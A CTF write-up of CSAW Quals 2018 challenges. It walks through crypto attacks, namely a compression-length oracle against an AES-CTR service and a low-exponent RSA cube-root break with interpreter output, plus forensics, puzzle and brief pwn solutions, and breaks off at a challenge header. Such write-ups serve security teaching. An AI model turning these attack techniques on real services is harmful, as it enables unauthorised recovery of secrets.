# 2018-09-14-CSAW-CTF-Quals #

[CTFTime link](https://ctftime.org/event/633) | [Website](https://ctf.csaw.io/)

---

## Challenges ##

### Crypto ###

 - [x] [50 babycrypto](#50-crypto--babycrypto)
 - [x] [100 flatcrypt](#100-crypto--flatcrypt)
 - [x] [200 lowe](#200-crypto--lowe)
 - [ ] 400 Holywater
 - [ ] 500 Collusion

### Forensics ###

 - [x] [150 simple_recovery](#150-forensics--simple_recovery)
 - [x] [200 🐼 Rewind](#200-forensics---rewind)
 - [x] [300 mcgriddle](#300-forensics--mcgriddle)
 - [x] [300 whyOS](#300-forensics--whyos)

### Misc ###

 - [x] [1 Twitch Plays Test Flag](#1-misc--twitch-plays-test-flag)
 - [x] [50 bin_t](#50-misc--bin_t)
 - [x] [75 Short Circuit](#75-misc--short-circuit)
 - [x] [100 Algebra](#100-misc--algebra)
 - [x] [200 Take an L](#200-misc--take-an-l)

### Pwn ###

 - [x] [25 bigboy](#25-pwn--bigboy)
 - [x] [50 get it?](#50-pwn--get-it)
 - [x] [100 shell->code](#100-pwn--shell-code)
 - [x] [200 doubletrouble](#200-pwn--doubletrouble)
 - [x] [250 turtles](#250-pwn--turtles)
 - [x] [300 PLC](#300-pwn--plc)
 - [x] [400 alien invasion](#400-pwn--alien-invasion)

### Reversing ###

 - [x] [50 A Tour of x86 - Part 1](#50-reversing--a-tour-of-x86---part-1)
 - [x] [100 A Tour of x86 - Part 2](#100-reversing--a-tour-of-x86---part-2)
 - [x] [200 A Tour of x86 - Part 3](#200-reversing--a-tour-of-x86---part-3)
 - [ ] 400 Not Protobuf
 - [ ] 500 1337
 - [x] [500 kvm](#500-reversing--kvm)

### Web ###

 - [x] [50 Ldab](#50-web--ldab)
 - [x] [100 sso](#100-web--sso)
 - [ ] 200 Hacker Movie Club
 - [ ] 400 No Vulnerable Services
 - [ ] 500 WTF.SQL

---

## 50 Crypto / babycrypto ##

**Description**

> yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet
> 
> single yeet yeeted with single yeet == 0
> 
> yeeet
> 
> what is yeet?
> 
> yeet is yeet
> 
> Yeetdate: yeeted yeet at yeet: 9:42 pm

**Files provided**

 - [`ciphertext.txt`](files/babycrypto-ciphertext.txt)

**Solution**

If we decode the ciphertext with Base64, we see a lot of non-ASCII characters:

    $ base64 -D < ciphertext.txt > b64dec.bin
    $ xxd b64dec.bin
    0000000: b39a 9091 df96 8cdf 9edf 8f8d 9098 8d9e  ................
    0000010: 9292 9a8d df88 9790 df9e 8c8f 968d 9a8c  ................
    0000020: df8b 90df 9c8d 9a9e 8b9a df8f 8d90 988d  ................
    0000030: 9e92 8cdf 8b97 9e8b df97 9a93 8fdf 8f9a  ................
    0000040: 908f 939a df9b 90df 939a 8c8c d1df b79a  ................
    0000050: df88 9e91 8b8c df8b 90df 8f8a 8bdf 9e8a  ................
    0000060: 8b90 929e 8b96 9091 df99 968d 8c8b d3df  ................
    0000070: 9e91 9bdf 8c9c 9e93 9e9d 9693 968b 86df  ................
    0000080: 9e93 9091 988c 969b 9ad1 dfb7 9adf 9b8d  ................
    0000090: 9a9e 928c df90 99df 9edf 8890 8d93 9bdf  ................
    00000a0: 8897 9a8d 9adf 8b97 9adf 9a91 9b93 9a8c  ................
    00000b0: 8cdf 9e91 9bdf 8b97 9adf 9691 9996 9196  ................
    00000c0: 8b9a df9d 9a9c 9092 9adf 8d9a 9e93 968b  ................
    00000d0: 969a 8cdf 8b90 df92 9e91 9496 919b d3df  ................
    00000e0: 9e91 9bdf 8897 9a8d 9adf 8b97 9adf 8b8d  ................
    00000f0: 8a9a df89 9e93 8a9a df90 99df 9396 999a  ................
    0000100: df96 8cdf 8f8d 9a8c 9a8d 899a 9bd1 9993  ................
    0000110: 9e98 849b 9699 9996 9ad2 979a 9393 929e  ................
    0000120: 91d2 98cf 8f97 cc8d 858d 9eb0 a6ce b59e  ................
    0000130: 93cb 9cb7 9eb9 a6c6 aca8 ad86 beae c99e  ................
    0000140: b782                                     ..

In fact, not a single byte is ASCII data - all the bytes are higher than `0x7F`. This indicates that the MSB (most significant bit) is `1` for all bytes. It also shows that this might not be the result of a "standard" cipher, which would (attempt to) distribute the values over the entire spectrum.

So an obvious possibility was that the MSB was simply set on all the bytes, and to decode we should ignore the byte:

```python
import sys
with open("b64dec.bin", "rb") as f:
  encoded = f.read()
  for c in encoded:
    sys.stdout.write(chr(ord(c) & 0x7F))
```

This produces some more ASCII-looking data, but it is still not readable and the most common character seems to be `_`. An underscore is `0x5F`, and if we put back the MSB we ignored, that value is `0xDF`, or `0b11011111`. If this is English text, we would expect the most common character to be `0x20` (a space), which happens to be `0x20`, or `0b00100000`. All the bits are inverted, so let's see if this works:

```python
import sys
with open("b64dec.bin", "rb") as f:
  encoded = f.read()
  for c in encoded:
    sys.stdout.write(chr(ord(c) ^ 0xFF))
```

And indeed:

    $ python invertBits.py

> Leon is a programmer who aspires to create programs that help people do less. He wants to put automation first, and scalability alongside. He dreams of a world where the endless and the infinite become realities to mankind, and where the true value of life is preserved.flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}

The flag seems a bit unrelated.

`flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}`

## 100 Crypto / flatcrypt ##

**Description**

> no logos or branding for this bug
> 
> Take your pick nc `crypto.chal.csaw.io 8040` `nc crypto.chal.csaw.io 8041` `nc crypto.chal.csaw.io 8042` `nc crypto.chal.csaw.io 8043`
> 
> flag is not in flag format. flag is PROBLEM_KEY

**Files provided**

 - [`serv-distribute.py`](files/flatcrypt-serv-distribute.py)

**Solution**

Let's examine the script:

```python
def encrypt(data, ctr):
  return AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter = ctr).encrypt(zlib.compress(data))

while True:
  f = input("Encrypting service\n")
  if len(f) < 20:
    continue
  enc = encrypt(
    bytes(
      (PROBLEM_KEY + f).encode('utf-8')
    ),
    Counter.new(64, prefix = os.urandom(8))
  )
  print("%s%s" % (enc, chr(len(enc))))
```

Our target is `PROBLEM_KEY` and we don't know `ENCRYPT_KEY`.

Whenever we interact with the script, we have to give it at least 20 bytes of data. It then prepends `PROBLEM_KEY` to our data, uses `zlib` to compress the result, and finally encrypts that using AES-CTR with a random counter. We get to see the encrypted result and the length of that data.

So there are a few things to note here. First of all, AES-CTR is not a block cipher, it is a stream cipher - it encrypts each byte separately and hence the size of the cipher text is the same as the size of the plain text. This is different from e.g. AES-CBC.

`zlib` is a standard compression library. By definition, it tries to compress data, i.e. make the output smaller than the input. The way this works is by finding sequences of data which occur multiple times in the input and replacing them with back-references. It works at the byte level, i.e. it can compress `1234 1234` to `1234 <back-ref to 1234>`, but it cannot compress `1234 5678` to  `1234 <back-ref to 1234 with +4 to byte values>`.

    $ python3
    >>> import zlib
    >>> # all bytes from 0 to 255:
    >>> len(bytes([ i for i in range(256) ]))
    256
    >>> # zlib compression makes the result larger:
    >>> len(zlib.compress(bytes([ i for i in range(256) ])))
    267
    >>> # the sequence 0, 1, 2, 3, 0, 1, 2, 3, ...:
    >>> len(bytes([ i % 4 for i in range(256) ]))
    256
    >>> # zlib compression identifies the repeating 0, 1, 2, 3:
    >>> len(zlib.compress(bytes([ i % 4 for i in range(256) ])))
    15

What do we actually do in this challenge? We cannot decrypt the AES, since we don't know the encryption key and the counter is 8 random bytes that would be very hard to predict. The only information leak that we have available is the size of the cipher text, and this depends on how well the `zlib` compression performs.

If you are not familiar with an attack like this, see [CRIME](https://en.wikipedia.org/wiki/CRIME) or [BREACH](https://en.wikipedia.org/wiki/BREACH).

How does `zlib` compression help us? Let's assume that `PROBLEM_KEY` is the string `good_secret`. Now let's append `baad` and `good` to `PROBLEM_KEY`, compress it, and check the length of the result:

    >>> len(zlib.compress(b"good_secret" + b"baad"))
    23
    >>> len(zlib.compress(b"good_secret" + b"good"))
    21

The length of the string we appended was the same, and yet the second is shorter - because `good` is a part of `PROBLEM_KEY` and hence even without knowing what `PROBLEM_KEY` is, we can tell that it contains `good`.

So this will be our general approach: send various strings to the server and character-by-character we can find out what `PROBLEM_KEY` is, based on how well our attempts compress.

There is just one complication in this challenge, and it is that our input needs to be at least 20 bytes. This is why the above-mentioned fact that `zlib` operates on the byte level is important to us. We can prepend our test string with 20 bytes that will definitely not occur in `PROBLEM_KEY`. The challenge tells us what the search space is for `PROBLEM_KEY`:

```python
# Determine this key.
# Character set: lowercase letters and underscore
PROBLEM_KEY = 'not_the_flag'
```

We can easily find a simple 20-byte string that doesn't contain lowercase characters or underscores: `1234567890ABCDEFGHIJ`. Even better, we can use it to our advantage. This will be the general outline of our search algorithm:

 - `padding` := "1234567890ABCDEFGHIJ"
 - start with an empty `known_flag` string
 - while `known_flag` is not the full flag:
   - for each `candidate` in the key alphabet:
     - send `padding` + `candidate` + `known_flag` + `padding` to the server
   - prepend the best-compressed `candidate` to `known_flag`

During the CTF my script first started with a three-byte string found by brute-force, then extended the candidate in both directions, but the above method is much simpler and less bandwidth-intensive.

([Full Python script here](scripts/flatcrypt.py))

    $ python solve.py
    o
    go
    ogo
    logo
    _logo
    a_logo
    _a_logo
    e_a_logo
    ve_a_logo
    ave_a_logo
    have_a_logo
    _have_a_logo
    t_have_a_logo
    nt_have_a_logo
    snt_have_a_logo
    esnt_have_a_logo
    oesnt_have_a_logo
    doesnt_have_a_logo
    _doesnt_have_a_logo
    e_doesnt_have_a_logo
    me_doesnt_have_a_logo
    ime_doesnt_have_a_logo
    rime_doesnt_have_a_logo
    crime_doesnt_have_a_logo
    done!

`flag{crime_doesnt_have_a_logo}`

## 200 Crypto / lowe ##

**Description**

> I personally prefer Home Depot
> 
> XOR Passes are the easiest way to use numbers to encrypt!
> 
> By Kris Kwiatkowski, Cloudflare

**Files provided**

 - [`file.enc`](files/lowe-file.enc)
 - [`key.enc`](files/lowe-key.enc)
 - [`publickey.pem`](files/lowe-publickey.pem)

**Solution**

First of all, let's have a look at all the files.

`file.enc` is Base64-encoded data, but it looks encrypted:

    $ base64 -D < file.enc > file.bin
    $ xxd file.bin
    0000000: 912b 68ca 798d e4b4 a78a e7b4 9c3c 658b  .+h.y........<e.
    0000010: d72c 4ab0 607b 167f 60ea 397b e314 91f2  .,J.`{..`.9{....
    0000020: 4ac2 f86d f211 ec63 2306 558c cc94 ea7d  J..m...c#.U....}
    0000030: b001 41ac f09b 9b85 00e2 7ee8 32bd b396  ..A.......~.2...

`key.enc` is a 462-digit (in decimal) number.

`publickey.pem` is an ASCII-formatted public key:

    $ openssl rsa -pubin -in pubkey.pem -text -noout
    Public-Key: (1536 bit)
    Modulus:
        00:cf:70:7e:ed:97:90:17:b7:f6:f4:76:ff:3b:a6:
        55:59:ad:b1:82:e0:7c:fa:23:33:b1:ec:05:6b:7f:
        7b:96:12:40:54:f1:f5:74:8b:04:c3:69:4e:90:f0:
        d9:9f:ee:05:84:a8:7a:70:81:75:80:d4:93:93:32:
        1b:b2:08:07:ff:de:25:a4:c8:ab:d4:6d:95:c1:e3:
        74:0d:9e:64:1f:e7:7f:9b:96:ce:ca:e9:18:e6:7a:
        24:89:52:b5:da:81:ae:77:42:bd:ae:51:b1:29:24:
        59:73:41:50:57:ae:75:df:b7:5a:78:e8:24:37:9e:
        52:50:65:92:c3:75:0e:9a:1c:7e:70:1b:ee:8d:df:
        c7:a9:ca:72:53:4c:d3:b0:95:79:f8:7a:4e:b3:76:
        f9:26:7c:d1:a1:6e:1e:57:90:95:c5:b8:6f:4b:8f:
        24:fb:61:3f:08:a7:e0:e4:75:d2:55:56:ae:41:c8:
        ce:e2:48:e9:0d:ac:96:5d:c4:7d:db:b4:c5
    Exponent: 3 (0x3)

It is an RSA public key. The one thing that should immediately stand out is that the exponent `e` is very low. In fact, the challenge title `lowe` must be referring to this fact. Since RSA operates on data in the form of numbers, we can guess that `key.enc` is actually the result of RSA encryption, formatted as decimal digits instead of the usual binary data.

Also, we can consult e.g. Wikipedia on [attacks against plain RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Attacks_against_plain_RSA) and see that a low exponent can mean that the exponentiated plain text will be strictly less than the modulus `n`. If this were the case, we could simply take the root (in this case the cube root) of the cipher text (i.e. the `key.enc` number) and get back the plain text.

    $ python3
    >>> import gmpy2
    >>> e = gmpy2.mpz(3)
    >>> cipher = gmpy2.mpz(219135993109607778001201845084150602227376141082195657844762662508084481089986056048532133767792600470123444605795683268047281347474499409679660783370627652563144258284648474807381611694138314352087429271128942786445607462311052442015618558352506502586843660097471748372196048269942588597722623967402749279662913442303983480435926749879440167236197705613657631022920490906911790425443191781646744542562221829319509319404420795146532861393334310385517838840775182)
    >>> gmpy2.iroot(cipher, e)
    (mpz(6028897571524104587358191144119083924650151660953920127739581033174354252210219577997969114849529704172847232120373331804620146706030387812427825026581462), False)

Unfortunately, this did not work - the second value in the tuple returned by `gmpy2.iroot` (integer root) indicates whether the root is exact. It is `False` in this case, so the returned number is not the actual plain text.

But `n` is fairly large, and `e` is really low, so let's not give up immediately. If `p^e`, i.e. the exponentiated plain text is not strictly smaller than `n`, then perhaps it only "overflowed" through the modulus a small number of times. We can check if `c + n` has an exact cube root, then `c + 2 * n`, and so on.

    >>> n = gmpy2.mpz(0xcf707eed979017b7f6f476ff3ba65559adb182e07cfa2333b1ec056b7f7b96124054f1f5748b04c3694e90f0d99fee0584a87a70817580d49393321bb20807ffde25a4c8abd46d95c1e3740d9e641fe77f9b96cecae918e67a248952b5da81ae7742bdae51b129245973415057ae75dfb75a78e824379e52506592c3750e9a1c7e701bee8ddfc7a9ca72534cd3b09579f87a4eb376f9267cd1a16e1e579095c5b86f4b8f24fb613f08a7e0e475d25556ae41c8cee248e90dac965dc47ddbb4c5)
    >>> gmpy2.iroot(cipher + n, e)
    (mpz(12950973085835763560175702356704747094371821722999497961023063926142573092871510801730909790343717206777660797494675328809965345887934044682722741193527531), True)
    >>> plain = int(gmpy2.iroot(cipher + n, e)[0])

And yes, `c + n` already has an exact cube root, no need to do a long and computationally heavy search. So what did we decrypt, exactly?

    >>> hex(plain)
    '0xf74709ad02fe85d8d3f993d5ff5716eabb5829df0d12624a048e0a4bd726a6c428a3cd5ac6248900113733effdf1dc4b8837209c92a9a3e161d0478d04dbd0eb'

It doesn't look like ASCII data. But the challenge description mentions XOR encryption. Also, the file we haven't used yet, `file.enc`, contains 64 bytes of data, and the key we just RSA-decrypted is also 64 bytes. Let's try to XOR the two:

    >>> key = bytes.fromhex(hex(plain)[2:])
    >>> data = open("file.bin", "rb").read()
    >>> bytes([ k ^ d for (k, d) in zip(key, data) ])
    b'flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}'

Again an unrelated-looking flag.

`flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}`

## 150 Forensics / simple_recovery ##

**Description**

> Simple Recovery Try to recover the data from these RAID 5 images!

**Files provided**

 - [`disk.img0.7z`](files/simple_recovery-disk.img0.7z)
 - [`disk.img1.7z`](files/simple_recovery-disk.img1.7z)

**Solution**

After extraction, we can check if the flag is hidden in plain text:

    $ strings disk.* | grep "flag{"
    <photoshop:LayerName>flag{dis_week_evry_week_dnt_be_securty_weak}</photoshop:LayerName>
    <photoshop:LayerText>flag{dis_week_evry_week_dnt_be_securty_weak}</photoshopTOSHOP

And it is...

`flag{dis_week_evry_week_dnt_be_securty_weak}`

## 200 Forensics / 🐼 Rewind ##

**Description**

> Sometimes you have to look back and replay what has been done right and wrong

**Files provided**

 - [`rewind.tar.gz`](https://ctf.csaw.io/files/ad0ffb17480563d0658ec831d0881789/rewind.tar.gz) (too large to host)

**Solution**

Once again, after extraction, let's check if the flag is hidden in plain text:

    $ strings disk.* | grep "flag{"
    while [ true ]; do printf "flag{FAKE_FLAG_IS_ALWAYS_GOOD}" | ./a.out; done
    while [ true ]; do printf "flag{FAKE_FLAG_IS_ALWAYS_GOOD}" | ./a.out; done
    flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}
    ... (repeats)
    flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}
    while [ true ]; do printf "flag{FAKE_FLAG_IS_ALWAYS_GOOD}" | ./a.out; done
    ...
    while [ true ]; do printf "flag{FAKE_FLAG_IS_ALWAYS_GOOD}" | ./a.out; done
    flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}
    ...
    flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}

And it is there again. I think the organisers overlooked this in both this challenge and [simple_recovery](#150-forensics--simple_recovery).

What this challenge *should* have been, I assume, is to get QEMU to replay the given VM snapshot with the given "replay" (which records all user interactions and non-deterministic I/O).

`flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}`

## 300 Forensics / mcgriddle ##

**Description**

> All CTF players are squares
> 
> Edit (09/14 8:22 PM) - Uploaded new pcap file
> 
> Edit (09/15 12:10 AM) - Uploaded new pcap file

**Files provided**

 - (before updates) [`output.pcap`](files/mcgriddle-output.pcap)
 - [`final.pcap`](files/mcgriddle-final.pcap)

**Solution**

Looking through (either) `pcap`, we can see that a chess game is being played, and the moves are indicated with [algebraic chess notation](https://en.wikipedia.org/wiki/Algebraic_notation_%28chess%29). The server responds with its own moves, and between the moves, SVG files are uploaded, each containing an `8 x 8` grid of characters, all of which seem to be Base64.

My first guess was that we treat the SVG grids as chessboards, then for each move of a piece, we take the squares that the piece moved from or to. The coordinates are relatively easy to parse from algebraic notation, but this method seemed to produce no readable text.

The next thing I tried was taking all the characters in the SVG grids and simply decoding them as they were without modifying them. This produced some garbage data, but some of it was readable. What I noticed in particular was that the data decoded from the very first grid has 12 bytes of garbage, followed by 24 bytes of readable text (some lorem ipsum filling text), then 12 bytes of garbage again.

    x x x x x x x x
    x x x x x x x x
    . . . . . . . .
    . . . . . . . .
    . . . . . . . .
    . . . . . . . .
    x x x x x x x x
    x x x x x x x x
    
    (x = garbage, . = data)

Given the presence of chess moves and the fact that this was the first grid, this was clearly the starting position, and characters covered by pieces should be ignored.

The chess game (in `final.pcap`) was quite long at 90+ moves, so I didn't feel like stepping through the moves myself and writing down the board state manually. Parsing SAN also seemed a bit too slow, so instead I just exported the moves into a standard format – the moves themselves were already encoded properly, I just numbered them properly:

    1. Nf3 Nf6 2. d4 e6 3. Nc3 d5 4. Bg5 Bb4 5. e3 h6 6. Bxf6 Qxf6 7. Bb5+ Bd7 8. O-O O-O 9. Ne5 Qe7 10. Bd3 Nc6 11. Nxd7 Qxd7 12. Ne2 Qe7 13. c4 dxc4 14. Bxc4 Qh4 15. Rc1 Rfd8 16. Ng3 a6 17. f4 Bd6 18. Ne4 Kh8 19. Nxd6 Rxd6 20. Be2 Qd8 21. Qb3 Rb8 22. Rf2 Ne7 23. Bh5 Kg8 24. Qd3 Nd5 25. a3 c6 26. Bf3 Qe7 27. Rfc2 Rc8 28. Rc5 Re8 29. Qd2 Qf6 30. Be4 h5 31. Qe2 h4 32. Qf3 Rd7 33. Bd3 Red8 34. Re1 Kf8 35. Qh5 Nxf4 36. exf4 Qxd4+ 37. Kh1 Qxd3 38. Qh8+ Ke7 39. Qxh4+ Kd6 40. Rc3 Qd2 41. Qg3 Kc7 42. f5+ Kc8 43. fxe6 fxe6 44. Rce3 Qxb2 45. Rxe6 Rd1 46. h3 Rxe1+ 47. Rxe1 Qf6 48. a4 Qf7 49. a5 Rd5 50. Qg4+ Kb8 51. Qg3+ Ka8 52. Re5 Qd7 53. Kg1 Ka7 54. Kh2 Rb5 55. Rxb5 axb5 56. Qe3+ Kb8 57. Qc5 Kc7 58. Kg1 Qd1+ 59. Kf2 Qd6 60. Qc3 Qf8+ 61. Kg1 b6 62. Qd4 Qc5 63. Qxc5 bxc5 64. Kf2 Kb7 65. Ke3 Ka6 66. h4 Kxa5 67. h5 c4 68. Kd2 Kb4 69. g4 Kb3 70. g5 Kb2 71. Ke2 c3 72. h6 gxh6 73. gxh6 c2 74. h7 c1=Q 75. h8=Q+ Qc3 76. Qf8 b4 77. Qf4 Qc2+ 78. Kf3 b3 79. Qd6 c5 80. Ke3 c4 81. Qe6 Qd3+ 82. Kf4 c3 83. Qe5 Ka3 84. Qa5+ Kb2 85. Qe5 Kc1 86. Qc5 b2 87. Qg1+ Kd2 88. Qg2+ Kd1 89. Qg4+ Kc2 90. Qg1 Qd6+ 91. Ke4 Qb4+ 92. Kf3 Qb7+ 93. Kf4 b1=Q 94. Qe3 Kb3 95. Kg5 Qd5+ 96. Kf4 Qbf5+ 97. Kg3 Qd6+ 98. Kg2 Qd2+ 99. Qxd2 cxd2 100. Kg1 d1=Q+ 101. Kg2 Qd2+ 102. Kg3 Qdf2#

Then I pasted this into the [analysis board on Lichess](https://lichess.org/analysis), and with some light Javascript I took the [FEN](https://en.wikipedia.org/wiki/Forsyth%E2%80%93Edwards_Notation) value at each turn. FEN notation encodes the momentary state of the game as opposed to the turn progression, so it is very easy to parse it to see which squares are occupied and which are not.

With the FENs, I masked each SVG grid and parsed the text. Unfortunately, no matter how I adjusted the parser, I could only see the end of the flag (`r3aLLLy_hat3_chess_tbh}`). I tried a couple of guesses but I didn't know how much of the flag I was missing.

After some frustration, I decided to look at the `output.pcap` file, which I downloaded earlier but didn't really use until now. The admin of the challenge said that there were solves on that version as well, so it was clearly not totally broken.

Since the flag in `final.pcap` was quite late in the chess game, the masking with chess pieces didn't really hide it and it might have been sufficient to simply decode the SVG grids without masking – so I tried this on the `output.pcap` grids and indeed, I found most of the flag there (except for the last three characters).

I guess a [grille cipher](https://en.wikipedia.org/wiki/Grille_(cryptography)) is not terribly effective when most of the grid is used, as is the case towards the end of the game.

`flag{3y3_actuAllY_r3aLLLy_hat3_chess_tbh}`

## 300 Forensics / whyOS ##

**Description**

> Have fun digging through that one. No device needed.
> 
> Note: the flag is not in flag{} format
> 
> HINT: the flag is literally a hex string. Put the hex string in the flag submission box
> 
> Update (09/15 11:45 AM EST) - Point of the challenge has been raised to 300
> 
> Update Sun 9:09 AM: its a hex string guys

**Files provided**

 - [`com.yourcompany.whyos_4.2.0-28debug_iphoneos-arm.deb`](files/whyos-app.deb)
 - [`console.log`](files/whyos-log.zip)

**Solution**

We are given an iOS app (or part of it perhaps), and a console log from an iOS device where the flag can presumably be located. The app itself seems pretty lacking, but we can see that it adds itself into the Preferences / Settings application. Our task is then to somehow find the flag in the console log.

The flag for this challenge is not in the `flag{...}` format, so a simple `grep` would not work. We do know that it is a hexadecimal string, but this is not extremely useful, given that the log file contains thousands of hexadecimal strings.

After searching the log manually for some time without much success, I decided to make the job a bit easier by separating the log entries into different files based on which application produced them. Each message has a simple format:

    ...
    default 19:11:39.936008 -0400   sharingd    TTF: Problem flags changed: 0x0 < >, AirPlay no
    default 19:11:39.944252 -0400   SpringBoard WIFI PICKER [com.apple.Preferences]: isProcessLaunch: 0,    isForegroundActivation: 1,     isForegroundDeactivation: 0
    default 19:11:39.944405 -0400   symptomsd   36246 com.apple.Preferences: ForegroundRunning (most elevated: ForegroundRunning)
    default 19:11:39.945559 -0400   SpringBoard SBLockScreenManager - Removing a wallet pre-arm disable assertion for reason: Setup
    default 19:11:39.945609 -0400   SpringBoard SBLockScreenManager - Removing a wallet pre-arm disable assertion for reason: Device blocked
    ...

The format being `<severity level> <timestamp>   <source application> <message>`.

([Full separator script here](scripts/WhyOS.hx))

The individual program logs were much easier to parse, since individually they contained a lot of repeating messages that would presumably not show the flag. Eventually I got to the Preferences app and found the flag among these lines:

    ...
    default 19:11:45.660046 -0400   Preferences feedback engine <_UIFeedbackSystemSoundEngine: 0x1d42a0ea0: state=4, numberOfClients=0, prewarmCount=0, _isSuspended=0> state changed: Running -> Inactive
    default 19:11:46.580029 -0400   Preferences viewDidLoad "<private>"
    default 19:12:18.884704 -0400   Preferences ca3412b55940568c5b10a616fa7b855e
    default 19:12:49.086306 -0400   Preferences Received device state note {uniqueID: <private>, weakSelf: 0x1d02af780}
    default 19:12:49.087343 -0400   Preferences Device note {isNearby: 1, isConnected: 0, isCloudConnected: 0, _nearby: 0, _connected: 0, _cloudConnected: 0}
    ...

It might not be obvious why this should be the flag, but all the other messages produced by the Preferences app made sense, i.e. they had some descriptive text. This hexadecimal string did not have any indication of what it meant, so it was "clearly" the flag.

`ca3412b55940568c5b10a616fa7b855e`

## 1 Misc / Twitch Plays Test Flag ##

**Description**

> `flag{typ3_y3s_to_c0nt1nue}`

**No files provided**

**Solution**

...

`flag{typ3_y3s_to_c0nt1nue}`

## 50 Misc / bin_t ##

**Description**

> Binary trees let you do some interesting things. Can you balance a tree?
> 
> `nc misc.chal.csaw.io 9001`
> 
> Equal nodes should be inserted to the right of the parent node. You should balance the tree as you add nodes.

**No files provided**

**Solution** (by [PK398](https://github.com/PK398))

The challenge gives you ~100 numbers and tells you to insert the numbers into an AVL Binary Tree and then do a pre-order traversal. The concept of trees should be familiar to programmers and should be able to insert into an AVL tree and be able to do a left and right rotate to balance a tree and if not there are plenty of implementations available online. Once the tree has been constructed, we can traverse it in a pre-order manner (print root, traverse the left subtree and then the right subtree) and print it as a comma-separated list and sending it back to the server gives us the flag.

`flag{HOW_WAS_IT_NAVIGATING_THAT_FOREST?}`

## 75 Misc / Short Circuit ##

**Description**

> Start from the monkey's paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.
> 
> - Elyk

**Files provided**

 - [`20180915_074129.jpg`](files/short-circuit-20180915_074129.jpg)

**Solution** (by [PK398](https://github.com/PK398))

![](screens/short-circuit.jpg)

`flag{owmyhand}`

## 100 Misc / Algebra ##

**Description**

> Are you a real math wiz?
> 
> `nc misc.chal.csaw.io 9002`

**No files provided**

**Solution**

After conecting we are presented with some simple math problems:

      ____                                     __ _           _            ___ ___ 
     / ___|__ _ _ __     _   _  ___  _   _    / _(_)_ __   __| |  __  __  |__ \__ \
    | |   / _` | '_ \   | | | |/ _ \| | | |  | |_| | '_ \ / _` |  \ \/ /    / / / /
    | |__| (_| | | | |  | |_| | (_) | |_| |  |  _| | | | | (_| |   >  <    |_| |_| 
     \____\__,_|_| |_|   \__, |\___/ \__,_|  |_| |_|_| |_|\__,_|  /_/\_\   (_) (_) 
                         |___/                                                     
    **********************************************************************************
    18 - X = 121
    What does X equal?: -103
    YAAAAAY keep going
    14 * X = 64
    What does X equal?: 64/14
    HEYYYY THAT IS NOT VALID INPUT REMEMBER WE ONLY ACCEPT DECIMALS!

At some point the problems become a bit lengthier:

    ...
    YAAAAAY keep going
    ((((1 - 5) + (X - 15)) * ((18 + 2) + (11 + 3))) - (((4 + 8) * (3 * 3)) * ((2 * 5) * (13 - 9)))) - ((((8 - 14) - (11 - 6)) - ((14 + 12) + (13 * 15))) - (((9 - 1) - (3 * 9)) * ((5 * 4) * (19 + 4)))) = -13338

And at some point later still, the intermediate results cross the overflow limits for both 32-bit and 64-bit integers. So Python with its native bigints seemed like a natural choice for the solver.

Performance was not particularly important for this challenge, since it seemed the server would wait 20 seconds before timing out on any given problem. Additionally, the equation always had one occurrence of `X`, always had a single integer on the right-hand side, and the operations on the left-hand side were grouped into parentheses properly and only included `+`, `-`, and `*`.

So my approach was to have a couple of simple regular expressions to match a bracketed operation with specific integers and replace that (in the equation string) with the result, then repeat as long as needed. Also, some of the problems had non-integer solutions. The default precision of Python seemed good enough, but I was worried about inaccuracy build-up if I used floats, so instead I kept the result as a fraction of two integers until the very end when it was submitted to the server.

([Full Python script here](scripts/algebra.py))

`flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}`

## 200 Misc / Take an L ##

**Description**

> Fill the grid with L's but avoid the marked spot for the W
> 
> `nc misc.chal.csaw.io 9000`
> 
> The origin is at (0,0) on the top left

**Files provided**

 - [`description.pdf`](files/take-an-l-description.pdf)

**Solution**

The challenge is a pretty simple algorithmic question - how to fill a `2^n x ^n` board with 1 hole with L-shaped tiles (each taking 3 squares). On connection the server always gives us a `n = 6`, i.e. a `64 x 64` board, but the fact that it is a power of two is significant, since this tiling works easily for any power of two board. Let's consider first how to tile boards with the hole in the top-left corner:

    n = 0, board size: 1 x 1
    
    O
    
    n = 1, board size: 2 x 2
    O ║
    ══╝
    
    n = 2, board size: 4 x 4
    O ║ ══╗
    ══╝ ║ ║
    ║ ══╝ ║
    ╚══ ══╝
    
    n = 4, board size: 8 x 8
    O ║ ══╗ ╔══ ══╗
    ══╝ ║ ║ ║ ══╗ ║
    ║ ══╝ ║ ══╗ ║ ║
    ╚══ ══╝ ║ ║ ══╝
    ╔══ ║ ══╝ ║ ══╗
    ║ ║ ╚══ ══╝ ║ ║
    ║ ╚══ ║ ║ ══╝ ║
    ╚══ ══╝ ╚══ ══╝
    
    ...

Notice that in each step, the top-left quarter is tiled the same as the step before. Furthermore, look at `n = 4` if we take out the middle tile:

    (     ) ╔══ ══╗
    ( n-1 ) ║ ══╗ ║
    (     ) ══╗ ║ ║
    (     )   ║ ══╝
    ╔══ ║     ║ ══╗
    ║ ║ ╚══ ══╝ ║ ║
    ║ ╚══ ║ ║ ══╝ ║
    ╚══ ══╝ ╚══ ══╝

All the quarters are actually tiled the same way, as `n - 1`, just turned differently. We just need to place a tile in the middle to connect them. In fact, it doesn't matter where the hole is in the board. We just need to separate the board into quarters and tile each quarter independently.

([Full Haxe script here](scripts/TakeL.hx))

`flag{m@n_that_was_sup3r_hard_i_sh0uld_have_just_taken_the_L}`

## 25 Pwn / bigboy ##

**Description**

> Only big boi pwners will get this one!
> 
> `nc pwn.chal.csaw.io 9000`

**Files provided**

 - [`boi`](files/boi)

**Solution** (by [Mem2019](https://github.com/Mem2019))

stack overflow to change the variable

## 50 Pwn / get it? ##

**Description**

> Do you get it?
> 
> `nc pwn.chal.csaw.io 9001`

**Files provided**

 - [`get_it`](files/get_it)

